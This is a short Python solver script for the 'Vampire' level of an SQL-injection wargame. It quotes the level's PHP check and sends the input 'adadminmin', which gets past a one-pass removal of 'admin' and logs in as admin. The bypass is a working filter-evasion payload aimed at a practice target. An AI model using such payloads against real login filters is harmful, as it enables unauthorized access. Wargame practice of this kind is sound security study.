#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Vampire

    if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
    $_GET[id] = strtolower($_GET[id]);
    $_GET[id] = str_replace("admin","",$_GET[id]); 
    $query = "select id from prob_vampire where id='{$_GET[id]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id'] == 'admin') solve("vampire"); 
    '''

    url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    param = dict(id="adadminmin")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('VAMPIRE Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
